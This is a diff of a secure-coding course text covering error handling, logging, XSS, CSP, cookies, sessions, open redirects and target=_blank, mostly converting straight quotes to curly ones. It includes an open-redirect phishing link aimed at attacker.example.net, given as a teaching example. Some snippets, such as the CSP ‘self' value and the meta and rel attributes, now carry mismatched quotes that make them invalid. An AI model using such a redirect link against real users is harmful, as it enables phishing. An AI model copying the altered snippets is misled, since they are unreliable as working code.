+If you are implementing the *top* level of a program or framework (e.g., its main event loop), you typically want to catch all exceptions (with perhaps a few, er, exceptions). Log the exception (with some details, except information like passwords that perhaps should be omitted from the log). Ensure that after the request or event has completed, including when an exception has been processed, that all resources have been returned if they should be. Finally, repeat the event loop to process the next event. Logging can aid debugging and intrusion detection. It is fine to tell the requestor that “there was a problem” while not providing many details; that is what the internal log is for.
 
 Otherwise, you generally should be specific about the exceptions you catch, and only catch an exception if you can do something appropriate about it. Attackers will try to trigger exceptions, so make sure that exception handlers are secure.
 
@@ -2434,13 +2434,13 @@ Otherwise, you generally should be specific about the exceptions you catch, and 
 
 There are other error-handling approaches.
 
-Some programming languages use type constructors that provide a return value that distinguishes normal values from error values. A good example of this is Haskell’s **Maybe**, which is defined as "**data Maybe a = Nothing | Just a**". This means that a **Maybe** value must be either **Nothing** or **Just** a value. This approach is like an error return, but, because the type system distinguishes value from errors (non-values), you cannot accidentally ignore errors; you have to extract the value to get a result. Some programming languages also provide constructs to easily do this extraction and otherwise propagate the error, e.g., the [“?” operator in Rust](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html) and [optional chaining in Swift](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html). Of course, you could intentionally write code to skip the error value (e.g., **Nothing**); beware of doing so if this could have a security impact.
+Some programming languages use type constructors that provide a return value that distinguishes normal values from error values. A good example of this is Haskell’s **Maybe**, which is defined as “**data Maybe a = Nothing | Just a**”. This means that a **Maybe** value must be either **Nothing** or **Just** a value. This approach is like an error return, but, because the type system distinguishes value from errors (non-values), you cannot accidentally ignore errors; you have to extract the value to get a result. Some programming languages also provide constructs to easily do this extraction and otherwise propagate the error, e.g., the [“?” operator in Rust](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html) and [optional chaining in Swift](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html). Of course, you could intentionally write code to skip the error value (e.g., **Nothing**); beware of doing so if this could have a security impact.
 
 Some languages allow multi-value returns and use that for error handling. For example, Go’s error conventions do this. Functions can return multiple values, and one of them can be an error value. This avoids the risks of overloading values as compared to traditional return values. However, like return values, there is a risk you will forget to check the separate error return value. For more details, check out [*The Go Blog: Error handling and Go*](https://blog.golang.org/error-handling-and-go) (2011), by Andrew Gerrand.
 
 #### Error Handling Wrap-up
 
-Error-handling is a fact of life, but you need to make sure your error handling (not just your "main" line) is secure. It is easy to forget to detect or handle errors. Where you can, try to use approaches that are more likely to work correctly *even* as the program is changed by others.
+Error-handling is a fact of life, but you need to make sure your error handling (not just your “main” line) is secure. It is easy to forget to detect or handle errors. Where you can, try to use approaches that are more likely to work correctly *even* as the program is changed by others.
 
 ### Quiz 3.6
 
@@ -2450,7 +2450,7 @@ Error-handling is a fact of life, but you need to make sure your error handling 
 
 [ ] You should catch all exceptions raised by the methods/functions you call. {{ selected: No, you should only catch an exception if you know what you will do with it. }}
 
-[x] If an exception is raised all the way to the "top" of a program (e.g., its event loop), you should typically log that exception, and then decide if the program will halt or continue.
+[x] If an exception is raised all the way to the “top” of a program (e.g., its event loop), you should typically log that exception, and then decide if the program will halt or continue.
 
 ### Logging
 
@@ -2476,13 +2476,13 @@ As a general rule, don’t include passwords or very sensitive data in logs. Sin
 
 \>\>Select all the true statement(s).<<
 
-[!] In general, logged information should also be displayed to the user who triggered it to speed debugging {{ selected: Absolutely not; the logs may contain sensitive or secret information, and users are often not fully trusted. Instead, report to the user what the user needs to know (e.g., "operation did not work"... and put the details in the logs. }}
+[!] In general, logged information should also be displayed to the user who triggered it to speed debugging {{ selected: Absolutely not; the logs may contain sensitive or secret information, and users are often not fully trusted. Instead, report to the user what the user needs to know (e.g., “operation did not work”... and put the details in the logs. }}
 
 [ ] Logging is often unnecessary because it is better to develop a system that is not vulnerable in the first place. {{ selected: It is great to develop a system without vulnerabilities. Since there is no way to be absolutely certain that is true, we need logging to enable detection of a problem, so that we can then respond to the issue. }}
 
 [x] Logs should generally include much more detail, but beware of including passwords and private keys, since logs are sometimes visible to many others. If you must include this data, consider including it as an encrypted or cryptographically-hashed value.
 
-[x] Your log system may need to record data from an attacker, so make sure your logging system is not vulnerable to a "log forging" attack (where an attacker provides data that causes the recorded log to be misleading in some way).
+[x] Your log system may need to record data from an attacker, so make sure your logging system is not vulnerable to a “log forging” attack (where an attacker provides data that causes the recorded log to be misleading in some way).
 
 ### Debug and Assertion Code
 
@@ -2498,7 +2498,7 @@ A good long-term strategy is to have a logging system enabled early, and either 
 
 #### Assertions
 
-Many languages have "assert" statements or expressions to state something that is *supposed* to always be true at runtime. These can be useful for sanity checking of a program while it runs. Examples include Java’s **assert** statement, Python’s **assert** statement, C/C++/Rust’s **assert()** macro, and JavaScript Node.js’s **assert()** method. In most languages, if the assertion fails at runtime, then an exception is thrown.
+Many languages have “assert” statements or expressions to state something that is *supposed* to always be true at runtime. These can be useful for sanity checking of a program while it runs. Examples include Java’s **assert** statement, Python’s **assert** statement, C/C++/Rust’s **assert()** macro, and JavaScript Node.js’s **assert()** method. In most languages, if the assertion fails at runtime, then an exception is thrown.
 
 Assertions are often great, because they can stop problems before they get more serious. However, if an attacker can cause an assertion to fail, that may lead to application exit or other behavior more severe than necessary. In particular, where practical:
 
@@ -2512,7 +2512,7 @@ Assertions are often great, because they can stop problems before they get more 
 
 🔔 A *Reachable Assertion* (an assertion an attacker can trigger), [CWE-617](https://cwe.mitre.org/data/definitions/617.html), is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #40. 
 
-Inserting assertions can make a verification technique called "fuzzing" more effective. So, it is often a good idea to have many assertions, as long as they are expressions that absolutely *should* always be true. We will discuss fuzzing in more detail later.
+Inserting assertions can make a verification technique called “fuzzing” more effective. So, it is often a good idea to have many assertions, as long as they are expressions that absolutely *should* always be true. We will discuss fuzzing in more detail later.
 
 ### Quiz 3.8
 
@@ -2528,11 +2528,11 @@ Inserting assertions can make a verification technique called "fuzzing" more eff
 
 Secure systems should be available to authorized users even while under attack. This is especially difficult if your system can be accessed via the public internet. Attackers may be able to launch a distributed DoS (DDoS) attack from many systems they control, creating millions or billions of requests. If an attacker has many resources, you may not be able to counter the attack *except* by using significant resources (including money) to handle the workload.
 
-One approach is to design your system to be able to handle larger amounts of traffic. That way, attacker requests will simply be handled. Design your system to be scalable (e.g., through containerization) and deploy on a cloud system where you can automatically (or at least rapidly) scale up to much larger sizes if there is demand. Use caches, Content Delivery Networks (CDNs), and minimize execution time per request so that more requests can be handled each second. Consider using a static site where this kind of website is a viable option. There are many ways to minimize execution time (aka increase performance); for many systems, maximal use of database indexes and eliminating so-called "N+1" queries is a good first step.
+One approach is to design your system to be able to handle larger amounts of traffic. That way, attacker requests will simply be handled. Design your system to be scalable (e.g., through containerization) and deploy on a cloud system where you can automatically (or at least rapidly) scale up to much larger sizes if there is demand. Use caches, Content Delivery Networks (CDNs), and minimize execution time per request so that more requests can be handled each second. Consider using a static site where this kind of website is a viable option. There are many ways to minimize execution time (aka increase performance); for many systems, maximal use of database indexes and eliminating so-called “N+1” queries is a good first step.
 
-However, at some point an attacker who controls enough resources will be able to overwhelm most services unless you are willing to spend a large amount of money to handle them. So another approach is to rapidly recover from excessive attacker-caused demand. Make sure your restart can be automated and that your system can restart relatively quickly. Where it is sensible, have a "backoff" mode (e.g., a read-only mode or separate service) so that *some* services are available during an aggressive attack.
+However, at some point an attacker who controls enough resources will be able to overwhelm most services unless you are willing to spend a large amount of money to handle them. So another approach is to rapidly recover from excessive attacker-caused demand. Make sure your restart can be automated and that your system can restart relatively quickly. Where it is sensible, have a “backoff” mode (e.g., a read-only mode or separate service) so that *some* services are available during an aggressive attack.
 
-Another way to make DoS attacks more difficult is to reduce the amount of resources your application requires. If resources are temporarily required (e.g., file handles, etc.), make sure their allocation and consumption is controlled and that they are returned when no longer needed. In addition, avoid "losing" resources. Memory is a resource automatically managed by many languages, but many other resources are not or are easily lost. If you have to manually return a resource in a language with exception handling, ensure that the resources are returned *even* when an exception is thrown.
+Another way to make DoS attacks more difficult is to reduce the amount of resources your application requires. If resources are temporarily required (e.g., file handles, etc.), make sure their allocation and consumption is controlled and that they are returned when no longer needed. In addition, avoid “losing” resources. Memory is a resource automatically managed by many languages, but many other resources are not or are easily lost. If you have to manually return a resource in a language with exception handling, ensure that the resources are returned *even* when an exception is thrown.
 
 🔔 There are several kinds of (related) resource handling vulnerabilities, and any of them can eventually lead to a denial of service. What is more, they are common problems:
 
@@ -2590,9 +2590,9 @@ A quick rule-of-thumb is that you should try to minimize the information your pr
 
 * If your program requires some sort of user authentication (such as many with a network connection), give the user as little information as possible before they authenticate. In particular, avoid giving away the version number of your program before authentication, unless this is easy to find anyway or it is the only instance of the program. Otherwise, if a particular version of your program is found to have a vulnerability, then users who don’t upgrade from that version advertise to attackers that they are vulnerable.
 
-* If a login fails, note that it failed, but in general don’t say why. For example, don’t say that the username is wrong, unless the attacker can get usernames anyway as public information. Never say a password is "almost" correct; it is correct or it is not.
+* If a login fails, note that it failed, but in general don’t say why. For example, don’t say that the username is wrong, unless the attacker can get usernames anyway as public information. Never say a password is “almost” correct; it is correct or it is not.
 
-* Don’t show passwords on the screen by default. For example, in HTML, use the "password" data type, because that normally replaces each password character with a dot. Otherwise, an attacker shoulder-surfing behind the user could get this information, or the information might accidentally be revealed by a user making a video.
+* Don’t show passwords on the screen by default. For example, in HTML, use the “password” data type, because that normally replaces each password character with a dot. Otherwise, an attacker shoulder-surfing behind the user could get this information, or the information might accidentally be revealed by a user making a video.
 
 * If you must display some sensitive information in a form, make that a separate page or have a button that can hide/reveal that information. Try to make hiding the sensitive information the default. Again, this helps counter shoulder-surfing and accidental revelation of information.
 
@@ -2612,7 +2612,7 @@ Make sure that you tell the receiver exactly how to interpret the output. Otherw
 
 * Clearly state the MIME type of the data that is being sent. Browsers can guess, but they may guess wrong.
 
-* Clearly state the character encoding of the output that is being sent. Don’t make the receiving program guess the character encoding! If the receiving program (typically the web browser) has to guess, the attacker may fool your system into sending material that leads to a wrong guess and eventually an attack. If you are sending HTML, usually you should tell the recipient that it is UTF-8. The best way to do that is via the HTTP **charset** option, which you can often do with a simple configuration option. If you cannot control that for some reason, include that information in the HTML **&lt;head&gt;**, e.g., **&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;**.
+* Clearly state the character encoding of the output that is being sent. Don’t make the receiving program guess the character encoding! If the receiving program (typically the web browser) has to guess, the attacker may fool your system into sending material that leads to a wrong guess and eventually an attack. If you are sending HTML, usually you should tell the recipient that it is UTF-8. The best way to do that is via the HTTP **charset** option, which you can often do with a simple configuration option. If you cannot control that for some reason, include that information in the HTML **&lt;head&gt;**, e.g., **&lt;meta http-equiv="Content-Type” content="text/html; charset=UTF-8"&gt;**.
 
 More generally, you often need to **_escape your output_** so that any data you generate that might be influenced by an attacker cannot become an attack. This is an especially common problem in web applications. One of the most common vulnerabilities in web applications is called *Cross-Site Scripting* (XSS). This problem is all about not sending output properly and, in particular, about escaping output correctly. The next unit will explain the vulnerability and how to deal with it.
 
@@ -2650,7 +2650,7 @@ In XSS, the system that is eventually attacked is the *web browser*. However, th
 
 * **DOM-based**<br>The web client sends the attack data to itself, typically using data provided from an attack and then sent via the DOM using JavaScript.
 
-🔔 XSS is such a common mistake in web applications that it is 2017 OWASP Top 10 #7. It is also 2019 CWE Top 25 #2. In CWE it is [CWE-79](https://cwe.mitre.org/data/definitions/79.html), *Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')*.
+🔔 XSS is such a common mistake in web applications that it is 2017 OWASP Top 10 #7. It is also 2019 CWE Top 25 #2. In CWE it is [CWE-79](https://cwe.mitre.org/data/definitions/79.html), *Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)*.
 
 #### The XSS Solution: Escape Output
 
@@ -2688,7 +2688,7 @@ The standard way to counter XSS is to escape all output that might be from an at
 
 In output sanitizing, just like input validation, it is often best to identify an allowlist and escape the rest. However, sometimes required output escapes are a well-defined list that you can directly apply, because sometimes you *can* safely enumerate the categories as we have done here for HTML. There are technically cases where you don’t have to apply the escapes to untrusted data, but in HTML it is often simpler and faster to just automatically apply them all unless you have a specific need to permit something else. Of course, these are only the escapes for HTML itself; these are not enough by themselves for other data formats (such as embedded URLs and HTTP headers).
 
-Here is the problem: You have to be *perfect*. If you escape output correctly 99.9% of the time, and you generate output in 1,000 places, your program is *vulnerable*. You may be a genius, but that is not relevant; even geniuses make mistakes. Even if the software was *originally* perfect, a later change can easily introduce a vulnerability. We need a better solution than "*never make a mistake that is easy to make*" - especially when something happens over and over again.
+Here is the problem: You have to be *perfect*. If you escape output correctly 99.9% of the time, and you generate output in 1,000 places, your program is *vulnerable*. You may be a genius, but that is not relevant; even geniuses make mistakes. Even if the software was *originally* perfect, a later change can easily introduce a vulnerability. We need a better solution than “*never make a mistake that is easy to make*” - especially when something happens over and over again.
 
 In most cases, the best solution for XSS is to **_choose a framework or library that automatically escapes HTML output for you_**. That way, the output escaping is done, but you don’t have to constantly think about it. Instead, the output system automatically escapes the output for you (this is sometimes called *auto escaping*). This escaping is typically done using one of the many templating systems available that let you specify the constant template (which is trusted and therefore goes through unescaped) and the data (where untrusted data is escaped by default).
 
@@ -2706,7 +2706,7 @@ In that case, where possible, use libraries *already designed* to allow only wha
 
 We have focused on escaping HTML, because that is the biggest problem in web applications. But HTML can embed other kinds of data, and of those, perhaps the most common are URLs.
 
-Embedded URLs must also be escaped, and the rules for escaping URLs are different. The URL syntax is generally **scheme:[//authority]path[?query][#fragment]**. For example, in the URL **&lt;https://www.linuxfoundation.org/about/&gt;**, the scheme is "**https**", authority “<b>www.linuxfoundation.org</b>”, path is “**/about/**”, and this example has no query or fragment part. Sometimes you need special characters in the path, query, or fragment. The conventional way to escape those parts of the URLs is to first ensure the data is encoded with UTF-8, and escape as “**%hh**” (where **hh** is the hexadecimal representation) all bytes except for “safe” bytes, which are typically **A-Z**, **a-z**, **0-9**, "**.**", "**-**", "**&#42;**", and "**&#95;**". The Java routine **java.net.URLEncoder.encode()** turns all spaces into “**+**” instead of “**%20**”; both the “**+**” and “**%20**” conventions are in wide use.
+Embedded URLs must also be escaped, and the rules for escaping URLs are different. The URL syntax is generally **scheme:[//authority]path[?query][#fragment]**. For example, in the URL **&lt;https://www.linuxfoundation.org/about/&gt;**, the scheme is “**https**”, authority “<b>www.linuxfoundation.org</b>”, path is “**/about/**”, and this example has no query or fragment part. Sometimes you need special characters in the path, query, or fragment. The conventional way to escape those parts of the URLs is to first ensure the data is encoded with UTF-8, and escape as “**%hh**” (where **hh** is the hexadecimal representation) all bytes except for “safe” bytes, which are typically **A-Z**, **a-z**, **0-9**, “**.**”, “**-**”, “**&#42;**”, and “**&#95;**”. The Java routine **java.net.URLEncoder.encode()** turns all spaces into “**+**” instead of “**%20**”; both the “**+**” and “**%20**” conventions are in wide use.
 
 #### XSS Alternatives
 
@@ -2748,7 +2748,7 @@ Perhaps the most important CSP capability is that CSP can control which scripts 
 
 Here is a simple CSP that prevents a large number of attacks. This CSP says that resources (in particular scripts and styles) are only from the source site (**&#39;self&#39;**), and that **inline** or **evals** for scripts and styles are not allowed (because they have not been specifically permitted):
 
-**Content-Security-Policy: default-src 'self';**
+**Content-Security-Policy: default-src ‘self';**
 
 The challenge with this CSP is that to use it to its full potential, we need to *stop* using inline styles and scripts. The HTML can request the *loading* of JavaScript files and CSS styles, but the JavaScript and CSS styles must be in separate files. The HTML may include lots of information important to scripts and styles (such as the **tag**, **class**, and **id**), but the HTML cannot embed scripts and styles directly.
 
@@ -2762,9 +2762,9 @@ As always, your goal is least privilege: try to make the CSP as restrictive as y
 
 2. Allow loading scripts and styles from specific other sites. You can set **default-src** (where script source files are loaded) to allow specific other websites you list. This tells the web browser that you fully trust those specific sites. Be careful; this can hurt user privacy. For example, each organization that manages those other sites will know at *least* whenever a user retrieves that information and their IP address.
 
-3. Allow specific hashes. You can set **default-src** to allow a specific inline program by saying that its cryptographic hash can be executed using the format **'&lt;hash-algorithm&gt;-&lt;base64-value&gt;'**. This can be a useful intermediate step if you have existing inline scripts, though in the long, term it would be better to move those scripts to a separate file.
+3. Allow specific hashes. You can set **default-src** to allow a specific inline program by saying that its cryptographic hash can be executed using the format **‘&lt;hash-algorithm&gt;-&lt;base64-value&gt;’**. This can be a useful intermediate step if you have existing inline scripts, though in the long, term it would be better to move those scripts to a separate file.
 
-CSP has various other mechanisms to limit privileges. Another CSP parameter that is especially important is **frame-ancestors**, which is a great tool for countering clickjacking attacks. A clickjacking attack is one where an attacker can "hijack" a click that the user intended for one purpose, but in fact the click was “hijacked” to do something else. Attackers typically do this by misusing HTML’s frame capabilities. If you don’t use frames - and most sites don’t - you can easily fix this by including “**frame-ancestors 'none';**” in your policy. If you do use frames, then use “**frame-ancestors 'self';**” instead.
+CSP has various other mechanisms to limit privileges. Another CSP parameter that is especially important is **frame-ancestors**, which is a great tool for countering clickjacking attacks. A clickjacking attack is one where an attacker can “hijack” a click that the user intended for one purpose, but in fact the click was “hijacked” to do something else. Attackers typically do this by misusing HTML’s frame capabilities. If you don’t use frames - and most sites don’t - you can easily fix this by including “**frame-ancestors ‘none';**” in your policy. If you do use frames, then use “**frame-ancestors ‘self';**” instead.
 
 When you are developing a site it might be wise to go through the CSP specification and try to maximally limit what you ask web browsers to allow. The less you allow, the less attackers can do if you make a mistake. There are other HTTP headers that can help harden a site against attack; in the next unit we will look at a few.
 
@@ -2792,7 +2792,7 @@ When you are delivering web pages you can limit what can be done with the result
 
 * **X-Frame-Options**<br>This should be set to **DENY** or **SAMEORIGIN**. Like the CSP **frame-ancestors**, this prevents the use of frames or only allows them from the origin, countering many clickjacking attacks. Technically, X-Frame-Options has been obsoleted by CSP **frame-ancestors**, but if you might have Internet Explorer (IE) users, you also need this as IE does not support CSP **frame-ancestors**.
 
-* **HTTP Strict-Transport-Security (HSTS)**<br>This means that *only* the secured HTTPS protocol, and not the insecure HTTP protocol, is permitted for future visits to this site for a given number of seconds. A common setting is "**Strict-Transport-Security: max-age=31536000;**" which means that *only* HTTPS will be allowed for a year (the number is the number of seconds). A larger number is fine.
+* **HTTP Strict-Transport-Security (HSTS)**<br>This means that *only* the secured HTTPS protocol, and not the insecure HTTP protocol, is permitted for future visits to this site for a given number of seconds. A common setting is “**Strict-Transport-Security: max-age=31536000;**” which means that *only* HTTPS will be allowed for a year (the number is the number of seconds). A larger number is fine.
 
 If your site is publicly accessible, you can easily test your headers using the [Security Headers website](https://securityheaders.com/).
 
@@ -2822,7 +2822,7 @@ Web servers can also set some attributes on the cookies they send. For example:
 
 * **HttpOnly** flag: The cookie is not visible to JavaScript programs. You should set this whenever practical.
 
-* **SameSite**: This has three main values - **None**, **Lax**, and **Strict**. "**None**" means that cookies are always sent to the matching web server. “**Lax**” means that cookies are sent if they are a **GET** (click) on a third-party website, and otherwise cookies are only sent if the request comes from the same site. “**Strict**” means that cookies are only sent in a first-party context; any request from another website will *not* cause the cookie to be sent. Historically, the web browser default was effectively **None**, but modern web browsers now act with **Lax** as the default because this counters certain attacks. We will discuss this later, but you should set this to at least **Lax** wherever practical.
+* **SameSite**: This has three main values - **None**, **Lax**, and **Strict**. “**None**” means that cookies are always sent to the matching web server. “**Lax**” means that cookies are sent if they are a **GET** (click) on a third-party website, and otherwise cookies are only sent if the request comes from the same site. “**Strict**” means that cookies are only sent in a first-party context; any request from another website will *not* cause the cookie to be sent. Historically, the web browser default was effectively **None**, but modern web browsers now act with **Lax** as the default because this counters certain attacks. We will discuss this later, but you should set this to at least **Lax** wherever practical.
 
 #### Cookies in Context
 
@@ -2832,7 +2832,7 @@ Cookies are important in part because they are often used to implement login ses
 
 #### Cookies and Login Sessions
 
-On the web, a common way to implement a login session is to have a login form. If the login is successful, the web server sends a "**session id**" within a cookie value. The session id is simply a large random number that cannot be guessed by anyone else. From then on, the web browser then sends this cookie (with the session id) whenever it contacts that web server. The web server can check this session id to see who is making the request… and if that session id is valid, the web server looks up the user id for that session and allows the user to whatever the user is authorized to do. Including a session id in a cookie is **not** the only way to use cookies to support login, but it is a common approach.
+On the web, a common way to implement a login session is to have a login form. If the login is successful, the web server sends a “**session id**” within a cookie value. The session id is simply a large random number that cannot be guessed by anyone else. From then on, the web browser then sends this cookie (with the session id) whenever it contacts that web server. The web server can check this session id to see who is making the request… and if that session id is valid, the web server looks up the user id for that session and allows the user to whatever the user is authorized to do. Including a session id in a cookie is **not** the only way to use cookies to support login, but it is a common approach.
 
 Normally, when developing web applications, you will use a framework or library that (mostly) handles login sessions for you. This is fine, just check to ensure that it is secure. Here we will cover some key features to look for. In some cases, your framework won’t do it by itself, but you can take some additional steps to make them happen.
 
@@ -2840,7 +2840,7 @@ First, if your framework uses session ids in cookies (a common approach), it is 
 
 1. The session identifier must have at least 128 bits of random data.
 
-2. The session id must be created using a *cryptographically secure* pseudo-random number generator (PRNG). Anything guessable (like *"add one to the last session id"* or *“ordinary call to random()”)* is not acceptable. We will discuss this in more detail later.
+2. The session id must be created using a *cryptographically secure* pseudo-random number generator (PRNG). Anything guessable (like *“add one to the last session id”* or *“ordinary call to random()”)* is not acceptable. We will discuss this in more detail later.
 
 3. Encrypt session ids between the web server and web browser. The usual solution is to set the cookie’s **Secure** flag and always communicate using HTTPS (TLS).
 
@@ -2856,7 +2856,7 @@ Whenever a user successfully logs in, make sure that the user *always* gets a *n
 
 🔔 Session fixation is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #37. It is [CWE-384](https://cwe.mitre.org/data/definitions/384.html).
 
-Similarly, make *sure* that you provide users a "log off" (“sign off”) action that *actually works*. If you use session ids - a common approach - then a log off should invalidate that session. This generally means that you need to remove the record of that session id from the server database that records active session ids (and the user id each session id applies to). You also need to tell the browser to delete the cookie or at least the session id value in that cookie. That way, the user is actually logged out. Users log out to reduce their risks, but this does not work if the application does not actually log them out. A surprisingly large number of major sites have, at one time or another, not logged out users when they requested it.
+Similarly, make *sure* that you provide users a “log off” (“sign off”) action that *actually works*. If you use session ids - a common approach - then a log off should invalidate that session. This generally means that you need to remove the record of that session id from the server database that records active session ids (and the user id each session id applies to). You also need to tell the browser to delete the cookie or at least the session id value in that cookie. That way, the user is actually logged out. Users log out to reduce their risks, but this does not work if the application does not actually log them out. A surprisingly large number of major sites have, at one time or another, not logged out users when they requested it.
 
 You should also eventually log out an inactive session automatically. Some easy ways to do that are to not set an expiration date (so the user will log out when they shut down their browser) or set an expiration date for when the user will be logged out. Frameworks will typically let you configure this easily.
 
@@ -2872,7 +2872,7 @@ You should also eventually log out an inactive session automatically. Some easy 
 
 This is false. If a user is logging in again, they are asking for a new session. Honor that request by creating a new session!
 
-Reusing an existing session can, in some implementations, open a system to an attack called session fixation. We have not gone into the details of session fixation in this course, but that is because the countermeasure ("don’t reuse session ids") is much easier to explain than the attack.
+Reusing an existing session can, in some implementations, open a system to an attack called session fixation. We have not gone into the details of session fixation in this course, but that is because the countermeasure (“don’t reuse session ids”) is much easier to explain than the attack.
 
 [Explanation]
 
@@ -2920,17 +2920,17 @@ This is true! This shows that sometimes it *is* possible to modify systems to pr
 
 A web application should not accept user-controlled input that specifies a link to some site on a different server and then, without strict controls, use that link to do a redirect. A web application that does this has an *open redirect*.
 
-This can be hard to understand, so let’s look at an example. Let’s imagine that a server-side web application has a "**/redirect**" link that accepts a parameter **url=**, and then simply redirects requests to the **url= value**. That means that an attacker could create an HTML file anywhere that looks like this (the example is based on text in MITRE’s text on [CWE-601](https://cwe.mitre.org/data/definitions/601.html)):
+This can be hard to understand, so let’s look at an example. Let’s imagine that a server-side web application has a “**/redirect**” link that accepts a parameter **url=**, and then simply redirects requests to the **url= value**. That means that an attacker could create an HTML file anywhere that looks like this (the example is based on text in MITRE’s text on [CWE-601](https://cwe.mitre.org/data/definitions/601.html)):
 
 <b>&lt;a href=&quot;https&#58;//bank.example.com/redirect?url=https&#58;//attacker.example.net"&gt;Click here to log in&lt;/a&gt;</b>
 
 What is the problem? The problem is that a user who checked the link would think that this link went to a trusted domain (e.g., **bank.example.com**). While technically that is true, when clicked, the supposedly trusted domain will quietly redirect the user to some other domain that might be dangerous and not what the user expected (e.g., **attacker.example.net**). More generally, the problem is that an open redirect can be used to fool humans and create stronger phishing attacks. Humans can be lulled into thinking they are going to a trusted domain, without realizing that they will in fact be immediately transferred to an untrusted domain. In theory, the users should also check *where they are now* on each page, but busy humans often don’t do that. We want to make it harder, not easier, to fool busy humans.
 
-A related problem is a "forward", where the web application forwards the request to some other part of the web application. The web application might incorrectly view the request as an *internal* request from the web application itself, instead of more accurately coming from an external user, and give it unwarranted privileges.
+A related problem is a “forward”, where the web application forwards the request to some other part of the web application. The web application might incorrectly view the request as an *internal* request from the web application itself, instead of more accurately coming from an external user, and give it unwarranted privileges.
 
 The [OWASP cheat sheet on unvalidated redirects and forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) discusses various possible countermeasures:
 
-* *"Simply avoid using redirects and forwards.*
+* *“Simply avoid using redirects and forwards.*
 
 * *If used, do not allow the URL as user input for the destination.*
 
@@ -2938,13 +2938,13 @@ The [OWASP cheat sheet on unvalidated redirects and forwards](https://cheatsheet
 
     * *This provides the highest degree of protection against the attack tampering with the URL.*
 
-    * *Be careful that this doesn't introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets*
+    * *Be careful that this doesn’t introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets*
 
 * *If user input can’t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.*
 
 * *Sanitize input by creating a list of trusted URLs (lists of hosts or a regex).*
 
-    * *This should be based on an allowlist approach, rather than a denylist."*
+    * *This should be based on an allowlist approach, rather than a denylist.”*
 
 🔔 Open redirects are such a common cause of security vulnerabilities that this weakness is 2019 CWE Top 25 #32. It is [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
 
@@ -2968,19 +2968,19 @@ This is true! The problem is not redirection, it is *unvalidated* redirection. O
 
 There is a peculiar problem with the HTML **target** attribute that many people are not aware of. Let’s explain the problem, and some partial solutions.
 
-In HTML, **&lt;a href=...>** creates a hyperlink. The HTML construct **&lt;a href=... target=...>** creates a hyperlink where, if you click on it, it creates a new "target". The default value for target is **&#95;self**; if you set **target**, a common one is **target="&#95;blank"** which creates the target in a new tab.
+In HTML, **&lt;a href=...>** creates a hyperlink. The HTML construct **&lt;a href=... target=...>** creates a hyperlink where, if you click on it, it creates a new “target”. The default value for target is **&#95;self**; if you set **target**, a common one is **target="&#95;blank”** which creates the target in a new tab.
 
-But what many don’t realize is that a value of "**target**" other than the default “**&#95;self**” may, in some cases, create a vulnerability. Because of the way it works, the page being linked to runs in the *same* process as the calling page. As a result, on a click the receiving page gains partial control over the linking page, *even if they are from different origins*. The primary way this happens is through the **window.opener** value. The receiving page can do things like force the *calling* page to navigate to a different page (e.g., **window.opener.location.href = newURL**), provide a new page that looks like the old one (even though it is in a different place), and fool the user into doing something on the “same” page that is not the same at all. A related problem is that the new page may also get “referrer” information that you might not have expected.
+But what many don’t realize is that a value of “**target**” other than the default “**&#95;self**” may, in some cases, create a vulnerability. Because of the way it works, the page being linked to runs in the *same* process as the calling page. As a result, on a click the receiving page gains partial control over the linking page, *even if they are from different origins*. The primary way this happens is through the **window.opener** value. The receiving page can do things like force the *calling* page to navigate to a different page (e.g., **window.opener.location.href = newURL**), provide a new page that looks like the old one (even though it is in a different place), and fool the user into doing something on the “same” page that is not the same at all. A related problem is that the new page may also get “referrer” information that you might not have expected.
 
-The same kind of problem can happen in JavaScript. JavaScript’s "**window.open**" has a default target of “**&#95;blank**”; since that is not “**&#95;self**”, the *default value* of **window.open()** is insecure. Again, it will open a window that loads another page that is simultaneously given control over its calling page, *even if* they have different origins.
+The same kind of problem can happen in JavaScript. JavaScript’s “**window.open**” has a default target of “**&#95;blank**”; since that is not “**&#95;self**”, the *default value* of **window.open()** is insecure. Again, it will open a window that loads another page that is simultaneously given control over its calling page, *even if* they have different origins.
 
 Of course, if you can trust that other page, that is not a security problem. So using a target value is often not a problem as long as you are referring to your *own* site. But if you are referring to another site, this may be more of a concern - are you sure you can trust it? Even if you trust your own or another site, it might be unwise to allow this - what happens if someone breaks into that part or that other site? Again, there is the principle of least privilege - we don’t want to give privileges if we don’t need to. This can also be a minor performance problem; page performance may suffer due to use of a shared process.
 
-The simplest solution is to avoid using **target=...** in HTML, and always set **target="&#95;self”** when calling JavaScript **window.open()...** especially for links to user-generated content and external domains. If you decide to use HTML **target=**, also use **rel="noopener noreferrer"**. The "**noopener**” tells the web browser to *not* allow the JavaScript to gain control over the referring window (so **window.opener** won’t give access to it). The ”**noreferrer**” prevents passing on the referrer information to the new tab/window ([*Security Vulnerability and Browser Performance Impact of Target=”&#95;blank”*](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547) by Darren Sim, 2019).
+The simplest solution is to avoid using **target=...** in HTML, and always set **target="&#95;self”** when calling JavaScript **window.open()...** especially for links to user-generated content and external domains. If you decide to use HTML **target=**, also use **rel="noopener noreferrer”**. The “**noopener**” tells the web browser to *not* allow the JavaScript to gain control over the referring window (so **window.opener** won’t give access to it). The ”**noreferrer**” prevents passing on the referrer information to the new tab/window ([*Security Vulnerability and Browser Performance Impact of Target=”&#95;blank”*](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547) by Darren Sim, 2019).
 
 ### Quiz 4.8
 
-\>\>In an HTML anchor (**&lt;a href=...>**) to another site, if you use **target=...** with a value other than **&#95;self**, be sure to also set "**rel**" to “**noopener noreferrer**” prevent control by that other site of the originating tab. True or False?<<
